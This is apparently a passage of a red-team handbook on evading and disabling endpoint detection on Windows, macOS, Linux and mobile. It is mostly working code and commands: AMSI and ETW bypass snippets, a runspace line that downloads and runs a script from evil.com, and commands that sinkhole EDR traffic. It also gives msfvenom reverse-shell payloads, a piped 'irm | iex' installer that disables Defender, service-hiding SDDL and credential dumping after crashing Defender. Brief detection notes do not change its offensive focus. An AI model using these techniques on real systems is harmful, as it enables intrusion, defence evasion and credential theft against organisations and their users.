#### 2. ETW Provider Registration Manipulation

Modify ETW provider registration to disable telemetry without patching:

```cpp
#include <evntrace.h>

BOOL DisableETWProvider(LPCGUID ProviderGuid) {
    EVENT_TRACE_PROPERTIES props = {0};
    props.Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES);
    props.Wnode.Guid = *ProviderGuid;
    props.Wnode.ClientContext = 1;
    props.Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    props.LogFileMode = EVENT_TRACE_REAL_TIME_MODE;

    return ControlTraceA(0, "EventLog-Application", &props, EVENT_TRACE_CONTROL_STOP) == ERROR_SUCCESS;
}

// Target Microsoft-Windows-PowerShell provider
GUID PowerShellProvider = { 0xA0C1853B, 0x5C40, 0x4B15,
    { 0x8B, 0x66, 0xD7, 0x4F, 0x9C, 0x91, 0xCC, 0x4C } };
DisableETWProvider(&PowerShellProvider);
```

#### 3. AMSI Context Manipulation

```cpp
typedef struct _AMSI_CONTEXT {
    DWORD Signature;      // 'AMSI' (0x49534D41)
    PVOID Session;
} AMSI_CONTEXT, *PAMSI_CONTEXT;

BOOL BypassAmsiContext(PAMSI_CONTEXT pContext) {
    if (pContext->Signature != 0x49534D41) return FALSE;
    DWORD oldProtect;
    VirtualProtect(pContext, sizeof(DWORD), PAGE_READWRITE, &oldProtect);
    pContext->Signature = 0;  // Invalidate
    VirtualProtect(pContext, sizeof(DWORD), oldProtect, &oldProtect);
    return TRUE;
}
```

#### 4. PowerShell Runspace Alternative (Patchless)

```csharp
using System.Management.Automation;
using System.Management.Automation.Runspaces;

var initialSessionState = InitialSessionState.CreateDefault();
initialSessionState.LanguageMode = PSLanguageMode.FullLanguage;

// This runspace has no AMSI hooks
var runspace = RunspaceFactory.CreateRunspace(initialSessionState);
runspace.Open();

var pipeline = runspace.CreatePipeline();
pipeline.Commands.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')");
pipeline.Invoke();
```

#### 5. Memory-Only AMSI Bypass (No Disk)

```powershell
# Reflection-based bypass (2025 variant)
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c = $b.GetFields('NonPublic,Static')
        ForEach($d in $c) {
            if ($d.Name -like "*Context") {
                $d.SetValue($null, 0)
            }
        }
    }
}
```

**Detection evasion notes:**
- **COM VTable Method:** Bypasses signature-based detection; harder to detect than direct patching
- **ETW Provider Manipulation:** Requires admin privileges but cleaner than hooking
- **Context Corruption:** Minimal memory writes; low detection surface
- **Runspace Method:** No patching required; entirely legitimate PowerShell usage
- **Reflection Method:** PowerShell-only; works in constrained language mode bypass scenarios

**Blue team detection:** Monitor for unusual COM interface access patterns to `amsi.dll`, ETW provider manipulation via `ControlTrace` API, PowerShell runspace creation with `FullLanguage` mode in restricted environments, reflection access to `System.Management.Automation` internal structures.

---

## 2.7 Network-Based EDR Silencing

These techniques disrupt the EDR agent's communication with its management servers.

### Sinkholing by Secondary IP Addresses `STABLE`

- **Concept:** Assign secondary IP addresses to local network interfaces that match the EDR's communication endpoint IPs.
- **Mechanism:** EDR agent's traffic routes to local interface instead, effectively dropping connections.
- **Implementation:**
  - Identify EDR communication IPs (via network monitoring)
  - PowerShell: `New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress <EDR_IP> -PrefixLength 32`
  - netsh: `netsh interface ipv4 add address "Ethernet" <EDR_IP> 255.255.255.255`
  - Tools like `IPMute` can dynamically add remote IPs as secondary local IPs.
- **Persistence:** Static IP settings stored in `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\IPAddress`.
- Changes via PowerShell/GUI/netsh modify registry via `wmiprvse.exe`/`DllHost.exe`/`netsh.exe` respectively.
- A device configuration profile that sets `VpnTrafficFilterList` will **override** any locally created IPsec rules.
- Direct registry edits require an interface disable/enable cycle to take effect.

> Some EDR/XDR products flag sudden `/32` self-IP assignments as potential IP spoofing. Expect alerts on repeated adds/removes. Prefer `/31` pairs or upstream firewall/DNAT approaches.

### IPSec Filter Rules `STABLE`

- **Concept:** Leverage Windows IPsec policies to block traffic to specific EDR IPs/ranges/domains.

```powershell
# Create a blocking policy
netsh ipsec static add policy name=BlockPolicy description="Block EDR Comms"
netsh ipsec static set policy name=BlockPolicy assign=y

# Create a filter list and add filters
netsh ipsec static add filterlist name=BlockFilterList
netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=<EDR_IP> protocol=any description="Block EDR IP"

# Create a blocking action and link
netsh ipsec static add filteraction name=BlockFilterAction action=block
netsh ipsec static add rule name=BlockRule policy=BlockPolicy filterlist=BlockFilterList filteraction=BlockFilterAction description="IPSec Block Rule for EDR"

# Cleanup
# netsh ipsec static delete policy name=BlockPolicy
```

- Policy stored in `HKLM\Software\Policies\Microsoft\Windows\IPSec\Policy\Local\`.

### DNS Sinkholing `STABLE`

**Hosts file modification:**
- Add entries to `C:\Windows\System32\drivers\etc\hosts` mapping EDR domains to `127.0.0.1` or `0.0.0.0`.
- Limitations: doesn't affect established connections; DNS may be cached; requires `ipconfig /flushdns`; ineffective if EDR uses hardcoded IPs.

**Changing DNS servers:**
- Point system DNS to attacker-controlled server or filtering service that blocks EDR domains.
- Same caching limitations apply; requires admin; easily detectable if monitored.

---

## 2.8 Kernel-Mode EDR Killers (BYOVD)

> Full BYOVD reference with driver catalog, IOCTLs, and engagement playbook: see **`byovd-drtm-xdr.md`**.

- **Bring-Your-Own-Vulnerable-Driver (BYOVD)** attacks load legitimately signed but exploitable drivers (e.g., `rtcore64.sys`, `iqvw64e.sys`, `terminator.sys`) to execute privileged code inside the kernel.
- **Typical payload actions:**
  - Patch or unregister kernel-mode notify callbacks (`PsSetCreateProcessNotifyRoutine`, `ObRegisterCallbacks`) to blind user-mode EDR
  - Overwrite or unload `WdFilter.sys` and other sensor drivers
- Public toolchains: **Terminator**, **kdmapper**, **EDRSensorDisabler**
- Case study: Lenovo `LnvMSRIO.sys` (CVE-2025-8061) exposes physical memory/MSR r/w to low-privileged users; can overwrite MSR_LSTAR and pivot to Ring-0.

> The vulnerable-driver blocklist (`DriverSiPolicy.p7b`) is **enabled by default** on Windows 11 22H2+ and refreshed every Patch Tuesday. Keep HVCI/KDP enabled and enable Hardware-Enforced Stack Protection (CET/Shadow Stack) on Windows 11 24H2 to break call-stack spoofing.

> Because the blocklist is on by default and updated frequently, a BYOVD chain now often needs **two** vulnerable drivers: one to disable Secure Boot or flip `CiOptions`, and a second to perform the EDR-killer actions.

---

## 2.9 Additional Evasion Techniques

### User-Mode Application Whitelisting Bypass (BYOVA) `EMERGING`

Windows Defender Application Control (WDAC) can be bypassed by leveraging vulnerabilities in trusted, signed Electron applications.

**Concept (Bring Your Own Vulnerable Application - BYOVA):**
- A trusted, signed Electron application with a known V8 vulnerability is used as a carrier
- The application's `main.js` is replaced with a V8 exploit that executes native shellcode
- If the application is whitelisted, WDAC allows it to run, executing the malicious shellcode

**Advantages:**
- Achieves native shellcode execution beyond pure JavaScript
- Shellcode runs in a browser-like process context where RWX memory regions (JIT compilers) are common and appear less suspicious

**Challenges:**
- **V8 version targeting:** Electron's V8 often lags behind Chrome's; vulns must post-date the target Electron version
- **Offset inconsistencies:** Public exploit offsets (often Linux-based) need Windows adjustment. Solution: launch exploit multiple times in child processes trying different offsets
- **Sandbox escape:** May need modified escapes for Electron's specific V8 version
- **JIT interference (TurboFan):** Optimizations can consolidate shellcode sequences. Workaround: compact shellcode or varying instruction positions
- **Payload obfuscation:** Re-obfuscate per deployment

**Defense:** Electron's experimental integrity fuse can verify `main.js` integrity at runtime.

### String Obfuscation `STABLE`

Language-specific obfuscation libraries:
- **Golang:** [Garble](https://github.com/burrowers/garble)
- **Rust:** [obfstr](https://github.com/CasualX/obfstr)
- **Nim:** [NimProtect](https://github.com/itaymigdal/NimProtect)

### PE Attribute Cloning & Code Signing `STABLE`

- Clone PE attributes from legitimate binaries to blend in
- Cloning an **unsigned** legitimate binary (like `at.exe`) and leaving the implant unsigned may bypass checks more effectively than cloning a signed binary with a spoofed cert
- **Timestamping server:** TSA server choice can unexpectedly influence detection rates
- **Always test locally** effectiveness depends on specific EDR/AV and environment

### Entropy, File Pumping, Bloating `STABLE`

- Lower entropy = appears less random/packed
- Add long strings of random English words to manipulate entropy
- Bloat file significantly so AV/EDR won't bother scanning

### Time-Delayed Execution `STABLE`

- Allows execution to time-out emulation sweeps
- Slow down each step: `alloc => chunk1 write ... chunkN write => execute`
- **General suggestions:**
  - Use `SORTED-RVA` strategy (`FreshyCalls`, `Runtime Function Table`)
  - Don't rely on fresh `NTDLL.DLL` parsing; don't load one from process/memory
  - Don't use direct syscalls that extract syscall

### Emulator Evasion `STABLE`

- Environmental keying check username, domain, specific UNC/SMB path, registry value
- IP geolocation call out to services like `http://ip-api.com/json` to verify location
- Verify expected process/filename sandboxes often rename samples to `<HASH>.exe`
- Verify expected parent process useful for DLL side-loading scenarios
- Check for physical display devices

### Controlled Decryption `STABLE`
- Carefully inspect environment before decompressing/decrypting shellcode
- For zero knowledge about environment, pull decryption keys from internet/DNS

### Fooling Import Hash (ImpHash) `STABLE`

1. Create unreachable code paths in native loader
2. In that unreachable code, call Windows APIs with dummy parameters
3. Compile the code
4. Locate those APIs in the executable's import address table
5. Overwrite imported function names in PE headers with random other names from the same DLL

### Command Line Spoofing `STABLE`
- Modifies command line arguments in process memory
- Hides actual parameters from EDR telemetry

### Killing Bit Technique `STABLE`

- Detection signatures implemented on: syscall hashes, assembly stub bytes, hashing routines/functions
- **Evasion:**
  - Implement your own or modify existing direct syscalls harness
  - After hashing algorithm change `KEY/BitShift/ROL/arithmetic` to refresh hashes
  - Insert junk instructions into assembly stubs to break static signatures
  - Use indirect syscalls: find `SYSCALL` instruction in `ntdll.dll` and jump there
- **General suggestions:**
  - Use `SORTED-RVA` strategy (`FreshyCalls`, `Runtime Function Table`)
  - Don't rely on fresh `NTDLL.DLL` parsing
  - Don't use direct syscalls that extract syscall

### DripLoader Technique `STABLE`

[DripLoader](https://github.com/xuanxuan0/DripLoader):

- Reserve 64KB chunks with `NO_ACCESS` protection
- Allocate chunks with `Read+Write` permissions in reserved pool (4KB each)
- Write shellcode in chunks using randomized order
- Change protection to `Read+Exec`
- Overwrite prologue of `ntdll!RtlpWow64CtxFromAmd64` with `JMP` trampoline to shellcode
- Use direct syscalls for memory operations and thread creation

> Successful initial execution doesn't guarantee stealth for subsequent actions. EDR can still detect malicious behavior later. In-memory evasion techniques remain critical.

### Telemetry Complexity Attacks (TCAs) `EMERGING`

Exploits mismatches between EDR data collection and processing capabilities:

- Generates deeply nested and oversized telemetry data structures
- Exploits bounded processing capabilities vs unbounded data collection
- Stresses serialization and storage boundaries in EDR pipelines
- Causes denial-of-analysis without requiring privileges or sensor tampering
- **Impact:** truncated/missing behavioral reports, rejected DB inserts, unresponsive dashboards, silent failures in correlation engines

### Azure/Entra Device Attribute Manipulation `EMERGING`

- Modify device attributes via `dsreg.dll` to impact device identification/monitoring
- `displayName` changes generate Azure audit logs (initiator: "Device Registration Service")
- `hostnames` changes do **not** generate Azure audit logs at all
- Both operations update local registry at `HKLM\SYSTEM\CurrentControlSet\Control\CloudDomainJoin\JoinInfo\{ID}\`

### Conditional Access Evasion `EMERGING`

- CA policies hinge on `trustType`, `deviceComplianceState`, and risk level
- Attackers with device certificate can invoke `DsregSetDeviceProperty()` to flip these flags, then `dsregcmd /refreshprereqs`
- **Impact:** stolen/cached tokens appear compliant, bypassing MFA or device-based restrictions until the next compliance refresh

---


# F3 Platform-Specific

## 3.1 Windows 11 24H2+ Security Baseline `STABLE`

- **Hardware-Enforced Stack Protection (CET/Shadow Stack)** breaks naïve call-stack spoofing; evasions must maintain valid shadow stacks.
- **LSASS protection (RunAsPPL)** is on by default on recent fresh installs; expect minidump blockers. Favor live-off-land telemetry for detection/response.
- **HVCI/KDP/Secure Launch** raise the bar on BYOVD and protected pages. Hunt for policy flips and failed driver loads.

### Quarterly Vulnerable Driver Blocklist
- `DriverSiPolicy.p7b` enabled by default on Windows 11 22H2+
- Automatic updates every Patch Tuesday via Windows Update
- Blocks known vulnerable drivers before they can load
- BYOVD attacks now often require two-stage driver chains
- Monitor for policy tampering: `HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy`

### Kernel Data Protection (KDP)
- Protects critical kernel structures and EDR code pages
- Makes them read-only even to kernel-mode drivers
- Requires HVCI to be enabled
- Significantly raises bar for kernel-mode EDR killers
- Verify status: `Get-ComputerInfo | Select CsDeviceGuardSecurityServicesRunning`

### Confidential Computing Support
- Intel TDX (Trust Domain Extensions) for VM-level isolation
- AMD SEV-SNP (Secure Encrypted Virtualization) support
- Protects guest VMs from hypervisor inspection
- EDR visibility limited in confidential VMs
- Requires specialized attestation and monitoring approaches

### Kernel Driver Blocklists & Core Isolation (23H2+)
- Windows ships quarterly updated vulnerable-driver blocklist; violations surface under _Device security > Core isolation_.
- KDP marks EDR code pages read-only even for kernel drivers.
- **Attacker response:** use driver-name collision (rename malicious driver to `iqvw64e.sys`) or flip `CiOptions` from a BYOVD payload before loading unsigned code.
- Defender quick checks: `Get-ProcessMitigation -System`, `Get-CimInstance -ClassName Win32_DeviceGuard`, `Get-WindowsDriver -Online -All | ? Name -match 'wd'`.
- Hardware-Enforced Stack Protection (CET/Shadow Stack) increasingly enabled (24H2+). Call-stack spoofing must account for CET or will fault.

### LSASS Protection (RunAsPPL) Defaults
- Windows 11 22H2 (new installs): LSA protection enabled by default when device is enterprise-joined and supports HVCI; upgrades may not auto-enable.
- Windows 11 24H2: LSA protection defaults are broader; Microsoft enables it by default on more device categories (MSA/Entra/hybrid/local) with evaluation behavior on upgrade.
- **Blue-team quick checks:**
  - Verify registry: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → `RunAsPPL`/`RunAsPPLBoot`
  - Confirm status with `Get-ProcessMitigation -System` and `Get-CimInstance Win32_DeviceGuard`

---

## 3.2 Firmware & Boot-Level Threats

- **UEFI Bootkits** (e.g., BlackLotus, CosmicStrand-2024) execute during the DXE phase, disable BitLocker and HVCI before Windows loads, and can patch kernel code pages before EDR starts.
- **Secure Boot bypass CVE-2024-7344** abuses an un-revoked test-signed shim to load unsigned payloads even with Secure Boot enabled.
- **Mitigations:**
  - Keep DBX revocation list current (August 2024 or later)
  - Enable Windows Defender System Guard Secure Launch and SVI
  - Collect & review TPM PCR[7] and System Guard logs for unexpected changes

---

## 3.3 macOS Evasion

- Starting with macOS Sonoma (14), every Gatekeeper verdict is logged via the unified log channel `sender=syspolicyd`. Blue teams monitor these; red teams should clear the quarantine flag **before** first execution or ship a notarised loader.
- Direct edits to **TCC.db** grant screen-recording, camera, or microphone entitlements without user prompts.
- Combine with notarised, ad-hoc signed apps to bypass Gatekeeper on macOS 15.
- macOS Sequoia (15) enhances XProtect and Background Task Management.
- Notarization requirements increasingly strict for all distributed software.
- Use EndpointSecurity (ES) events with unified logs; monitor `syspolicyd` verdicts and TCC changes.

---

## 3.4 Linux / Container / Kubernetes

### eBPF Runtime Sensors
- Tools like **Falco 0.38+**, **Cilium Tetragon** (real-time enforcement with `kubectl tetragon observe`), and **AWS GuardDuty eBPF** hook `sys_enter` tracepoints and kprobes to emulate EDR telemetry on K8s nodes.
- **Evasion:**
  - Detach or overwrite the eBPF program with `bpftool prog detach`
  - Remount `debugfs` elsewhere to hide BPF maps and programs
  - Hide processes in sidecar containers that run outside the node-agent's PID namespace filter

### PID-Namespace & Cgroup Tricks
- **CVE-2025-26324** leaks host PIDs, allowing a container process to open `/proc/<hostpid>/mem` and bypass namespace-based sensors.
- Sidecars running in the host network namespace can exfiltrate data without visibility from node-level agents.

### Linux/K8s Hunting
- Hunt eBPF program/map churn and sensor detaches
- Monitor sidecars outside node-agent PID filters
- Watch for attempts to access runtime sockets
- eBPF-based EDR becoming standard (Falco, Tetragon, Cilium)
- Container runtime security monitoring essential
- Service mesh observability integration (Istio, Linkerd)

---

## 3.5 Mobile (Android / iOS)

- **Android 13/14:** SIM-swap plus deferred `appops` removes MDM profiles without factory reset.
- **iOS 17 KFD exploit** enables sideloading unsigned binaries that most Mobile Threat Defence solutions fail to scan.

---

# F4 Infrastructure Attacks

## 4.1 Driver Attack Surface Analysis

A systematic approach to analyzing EDR drivers from a low-privileged user perspective.

### 1. Driver Discovery

**Static analysis:**

```powershell
# List loaded drivers
driverquery /v
Get-WindowsDriver -Online -All

# Using WMI
Get-WmiObject Win32_PnPSignedDriver | Select-String "EDR_Vendor"
```

**Dynamic analysis:**

```powershell
# Using sc command
sc query type= driver state= all

# Process Monitor filtering
# Filter: Process and Thread Activity -> Show Image/DLL
```

### 2. Interface Enumeration

**Device driver interfaces:**
- Listed in WinObj under "GLOBAL??" as Symbolic Links
- Accessible via `\\.\DEVICE_NAME` format
- Tools: WinObj (Sysinternals), DeviceTree (OSR discontinued)

**Mini-filter driver interfaces:**
- Listed in WinObj as "FilterConnectionPort" objects
- Communication via `FltCreateCommunicationPort` API
- Example paths: `\CyvrFsfd`, `\SophosPortName`

### 3. Access Permission Analysis

**Device driver ACL checking:**

```cpp
// Using DeviceTree (preferred) or kernel debugger
// WinDbg example:
!object \Device\DeviceName
!sd <SecurityDescriptor_Address> 1
```

**FilterConnectionPort ACL checking:**

```powershell
# Using NtObjectManager (James Forshaw)
Get-FilterConnectionPort -Path "\FilterPortName"
# Error indicates access denied

# In WinDbg:
!object \FilterPortName
dx (((nt!_OBJECT_HEADER*)0xAddress)->SecurityDescriptor & ~0xa)
!sd <SecurityDescriptor_Address> 1
```

### 4. Interface Functionality Analysis

**Device driver communication:**
- Primary method: `DeviceIoControl()` → `IRP_MJ_DEVICE_CONTROL`
- IOCTL codes differentiate between functions
- May include process ID verification for authorization

**FilterConnectionPort communication:**
- Uses callback functions: `ConnectNotifyCallback`, `DisconnectNotifyCallback`, `MessageNotifyCallback`
- Similar to IOCTL dispatch with different message types

### 5. Common EDR Driver Interfaces

**Palo Alto Cortex XDR:**
- **Device interfaces:**
  - `\\.\PaloEdrControlDevice` (tedrdrv.sys) ~20 IOCTL handlers
  - `\\.\CyvrMit` (cyvrmtgn.sys) Legacy Cyvera interface
  - `\\.\PANWEdrPersistentDevice11343` (tedrpers-<version>.sys) Persistent device interface
- **FilterConnectionPort:** Various ports with different ACLs
- **Research findings:**
  - IOCTL `0x2260D8` returns 3088 bytes of statistics data (accessible to low-privileged users)
  - IOCTL `0x2260D0` provides initialization status information
  - Some interfaces accessible due to injected DLL architecture requiring broad permissions

**Sophos Intercept X:**
- **FilterConnectionPort:** `\SophosPortName`
- Accessible interfaces for legitimate process communication but limited attack surface

### 6. Why EDRs Have Open ACLs

EDRs often use an architecture where:
- Agent injects DLLs into processes (including low-privileged ones like `word.exe`)
- Injected DLLs communicate directly with drivers via IOCTLs
- Drivers cannot restrict based solely on process privilege level
- Results in more permissive ACLs to accommodate legitimate injected processes

---

## 4.2 ALPC Communication Attacks

Advanced Local Procedure Call (ALPC) is commonly used for EDR inter-process communication.

### ALPC Technical Background

- Windows Advanced (or Asynchronous) Local Procedure Call IPC mechanism for same-host communication
- Undocumented by Microsoft developers intended to use official libraries like RPCRT4.dll
- Fast and efficient; heavily used within Windows OS
- Commonly implemented as Windows RPC "ncalrpc" transport

**ALPC port registration example (from Cortex XDR analysis):**

```cpp
RpcServerUseProtseqEp(L"ncalrpc", RPC_C_PROTSEQ_MAX_REQS_DEFAULT, endpoint, NULL);
RpcServerRegisterIf(interface_handle, NULL, NULL);
RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
```

**Key ALPC characteristics:**
- **Port naming:** If port name is NULL, random name like `LRPC-71dcaff45b0f633aad` is assigned
- **Access control:** Ports can be restricted using Security Descriptors
- **Endpoint Mapper:** Most EDR ports are NOT registered at RPC Endpoint Mapper
- **Visibility:** ProcessHacker/SystemInformer shows all ports in Handles tab; WinObj shows them under `\RPC Control\`

**ALPC vulnerability categories:**
- Weak access control (missing restrictions)
- Memory corruption (bugs in function parameter handling)
- Impersonation issues
- DoS via blocking (previously undiscussed publicly)

---

## 4.3 Namespace Object Exploitation

**Object manager namespace attacks:**
- Exploit how EDRs handle preexisting objects in the Object Manager's namespace
- Can cause permanent agent crashes/stops for low-privileged users

**Exploitation techniques:**

_ALPC Port Pre-registration:_

```powershell
# Create ALPC port with EDR's expected name
# This blocks the EDR from creating its communication channel
$portName = "LRPC-EDRCommPort"  # Example EDR port name
```

_Mutex/Event Object Blocking:_

```powershell
New-Item -Path "\\.\Global\EDR_AGENT_MUTEX" -Force

$objects = @(
    "\\.\Global\CortexAgentMutex",
    "\\.\Global\DefenderStartupEvent",
    "\\.\Global\EDRInitComplete"
)
foreach ($obj in $objects) {
    try { New-Item -Path $obj -Force } catch {}
}
```

_Named Pipe Blocking:_

```cpp
HANDLE hPipe = CreateNamedPipe(
    L"\\\\.\\pipe\\EDRCommunication",
    PIPE_ACCESS_DUPLEX,
    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
    1, 1024, 1024, 0, NULL
);
```

**Persistence via scheduled tasks:**

```powershell
# High-priority logon trigger to win the race
schtasks /create /tn "SystemInit" /tr "C:\Windows\System32\namespace_blocker.exe" /sc onlogon /rl highest /ru "NT AUTHORITY\SYSTEM"

# Event-based trigger
schtasks /create /tn "ServiceInit" /tr "C:\Tools\block_edr.exe" /sc onevent /ec system /mo "*[System[EventID=7036 and Data='Windows Defender Antivirus Service']]"
```

---

## 4.4 Scanning Engine DoS

A technique to disable EDRs by exploiting memory corruption vulnerabilities in their file scanning engines.

**Concept:**
- Trigger memory corruption bugs in EDR scanning engines
- Crashes the main EDR process when malicious files are scanned
- Can be deployed alongside initial access payloads or before credential dumping

**Microsoft Defender targeting (`mpengine.dll`):**

_File-based DoS vectors:_
```powershell
# Create malicious files that crash Defender during scanning
# PE files with specific corruption patterns
# Encrypted Office documents with malformed saltSize values
# JavaScript files that trigger emulation crashes
# Mach-O files that cause Lua script execution errors
```

_Delivery methods:_
```html
<!-- Web-based delivery via download -->
<a href="malicious.pdf" download>Download PDF</a>
<!-- Crashes Defender when Real-time Protection scans the file -->
```

```powershell
# SMB share delivery for lateral movement
copy crash_defender.docx \\target\share\documents\
# Defender crashes when scanning uploaded file
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```

**Attack sequence (initial access):**
1. Deliver crash file alongside main payload
2. Crash file triggers when Defender scans downloads folder
3. Main EDR process (MsMpEng.exe) crashes and restarts
4. Execute main payload during restart window
5. Subsequent malicious activity may go undetected

**Attack sequence (internal movement):**
1. Upload crash file to network share before credential dumping
2. Wait for Defender to scan and crash
3. Execute credential dumping tools
4. EDR restart may not catch the dumping activity

**Limitations:**
- Requires specific file format knowledge
- Some crashes only occur with PageHeap enabled
- Microsoft may quietly patch vulnerabilities
- Defender restarts automatically, limiting window

---

## 4.5 Telemetry Complexity Attacks (TCAs)

See [§2.9 TCAs](#telemetry-complexity-attacks-tcas-emerging).

---

## 4.6 Agent Tampering & Tamper-Protection Bypasses

- Microsoft Defender's Tamper Protection (and similar vendor self-protection) can be disabled by:
  - Launching a TrustedInstaller-child process and modifying service registry keys (e.g., `sc config Sense start= disabled`)
  - Changing ACLs on `WdFilter` or `SenseIR` registry values, then rebooting so the filter driver never loads
- Many commercial EDRs expose self-protection flags via WMI namespaces; clearing the flag allows the agent service to be stopped or deleted
- **Detection guidance:** alert on writes to antivirus/EDR service parameters or attempted driver unloads while service is running

---

## 4.7 Cloud-Side XDR Telemetry Throttling & Poisoning

- Local evasion is incomplete: vendors replay queued events when connectivity returns
- Attackers therefore:
  - Throttle upload intervals (e.g., `SenseUploadFrequency`) to several hours
  - Inject thousands of benign events (mass process creations) to drown anomaly-detection models ("telemetry poisoning")
- Blue teams should monitor for sudden policy flips or extreme event-volume spikes with low entropy

---

# F5 Strategy & Tooling

## 5.1 OpSec Quickstart (Lab)

**Pre-run:**
- Network: block or sinkhole vendor EDR/XDR endpoints; disable cloud sample submission; tag lab hosts.
- Mitigations snapshot: `Get-ProcessMitigation -System`; `Get-CimInstance Win32_DeviceGuard` (VBS/HVCI/KDP); `Get-MpPreference` (ASR/Cloud).
- Events baseline: enable and tail `Microsoft-Windows-CodeIntegrity/Operational`, `Security (4688/4689)`, `Microsoft-Windows-Sense/Operational`, Sysmon (if present).

**Injection hygiene:**
- Favor `MEM_IMAGE` mappings (ghosting/herpaderping/overwriting) over `MEM_PRIVATE` RWX to avoid 24H2 hotpatch loader checks.
- Satisfy XFG/CET: jump via import thunks; ensure IBT `ENDBR64` at indirect targets; maintain plausible stacks for syscalls (replicate `ntdll` frames).
- Avoid noisy APIs: split `alloc/write/exec` over time; prefer APC+`NtContinue` pivots; keep thread contexts consistent.

**Telemetry minimization:**
- Jitter long-lived channels; prefer named-pipe/HTTP3 over noisy HTTP1; throttle upload intervals.
- Use COM/runspace over PowerShell console to reduce script-block logs; avoid AMSI-flagged prologues.

**Cleanup:**
- Remove services, tasks, drivers; restore SDDL; revert registry policy flips (WDAC/CI/Defender) and re-enable protections.
- Purge user caches (Recent Files, Jump Lists) and ETW providers enabled during tests.

---

## 5.2 General Evasion Strategy & Persistence

- Using a less known C&C tool with indirect system calls and `.dll` is recommended
- Avoid built-in `execute assembly` option of C&C tools; use community extensions (BOF or inline execute assembly)
- Example tools: [Certify](https://github.com/GhostPack/Certify), [SharpHound](https://github.com/BloodHoundAD/SharpHound)

**Sample EDR bypass flow:**
1. User downloads a ZIP containing `.lnk` file (modern browsers refuse direct LNK downloads)
2. `.lnk` executes `mshta.exe` with malware location as argument (bypasses AppLocker)
3. `mshta.exe` downloads and executes a `.hta` malicious file from our server
4. Due to DLL hijacking, payload executes every time Microsoft Teams is opened
5. EDR doesn't detect infection

### EDR Evasion Strategy for Persistence

Complete EDR evasion is challenging. Focus on:

- **Delayed & extended execution** dechain file write & exec events
- **Use VBA/WSH to drop DLL/XLL:**
  - COM hijacking
  - DLL side-loading/hijacking
  - XLL, XLAM, WLL persistence
  - Drop `VbaProject.OTM` to backdoor Outlook (particularly effective against CrowdStrike)
  - Drop CPL (`%APPDATA%\Microsoft\Outlook\VbaProject.OTM`)
- **Hide Services** using SDDL strings to modify service permissions:
  ```shell
  # Example: Hiding a service named 'evilsvc'
  sc sdset evilsvc "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
  ```
  See [SID Strings](https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings) for documentation.

### AV-Specific Evasion
- Example: McAfee exclusions can be found in logs:
  - `c:\ProgramData\McAfee\Endpoint Security\Logs\AdaptiveThreatProtection_Activity.log`
  - Discovering excluded processes (like `conhost.exe`) enables targeted injection

**Additional reading:**
- [Hang Fire](https://medium.com/@matterpreter/hang-fire-challenging-our-mental-model-of-initial-access-513c71878767)
- [Macroless Phishing](https://www.youtube.com/watch?v=WlR01tEgi_8)

---

## 5.3 Practical Testing Lab Setup

### Kali (Attacker) Setup

```bash
# Generate shellcode
msfvenom -p windows/x64/Meterpreter/reverse_tcp LHOST=192.168.242.128 LPORT=443 EXITFUNC=thread --platform windows -f raw -o reverse64-192168242128-443.bin

# Launch Meterpreter listener
msfconsole
use exploit/multi/handler
set payload windows/x64/Meterpreter/reverse_tcp
set LPORT 443
set LHOST 192.168.242.128
run
```

### Windows (Victim) Setup

- Ensure VMs can communicate
- Keep Windows and Defender updated
- Create antivirus exclusion on test directory
- Disable "Automatic sample submission" during testing (re-enable outside testing)

---

## 5.4 Windows Defender Bypass Tools & WSC Abuse

### Defender Bypass Tools

Available at [DefenderBypass](https://github.com/hackmosphere/DefenderBypass):

- **myEncoder3.py** Transforms binary files to hex and applies XOR encryption
- **InjectBasic.cpp** Basic shellcode injector in C++
- **InjectCryptXOR.cpp** Adds XOR decryption for encrypted shellcode
- **InjectSyscall-LocalProcess.cpp** Uses direct syscalls to bypass userland hooks
- **InjectSyscall-RemoteProcess.cpp** Injects shellcode into remote processes

**Progressive techniques:**
1. Begin with basic shellcode execution
2. Add encryption/obfuscation
3. Implement direct syscalls to bypass monitoring
4. Move to remote process injection when needed

### WSC API Abuse (defendnot) `EMERGING`

Abuses the Windows Security Center (WSC) service to disable Windows Defender by registering a fake antivirus.

- **Concept:** WSC is used by legitimate AVs to notify Windows that another AV is present, causing Windows to automatically disable Defender.
- **Implementation:** [defendnot](https://github.com/es3n1n/defendnot) directly interacts with the undocumented WSC API to register itself as an antivirus.
- **Advantages:**
  - Completely disables Windows Defender rather than just evading detection
  - Uses legitimate Windows functionality (WSC service)
  - More reliable than traditional bypass methods
  - Successor to older techniques like "no-defender"

**Installation methods:**

```powershell
# Basic installation
irm https://dnot.sh/ | iex

# With custom AV name
& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "Custom AV name"

# Silent installation (no console allocation)
& ([ScriptBlock]::Create((irm https://dnot.sh/))) --silent
```

**Command line options:**
- `--name` Custom antivirus display name
- `--disable` Disable defendnot
- `--verbose` Verbose logging
- `--silent` No console allocation
- `--autorun-as-user` Create autorun task as current user
- `--disable-autorun` Disable autorun task creation

**Technical details:**
- WSC API is undocumented and typically requires Microsoft NDA
- Registers the fake AV directly with WSC
- Requires persistence via autorun to maintain registration after reboot
- Binaries must remain on disk for continued operation

**Limitations:**
- Requires autorun persistence (detectability concern)
- May be flagged by other security solutions monitoring WSC changes
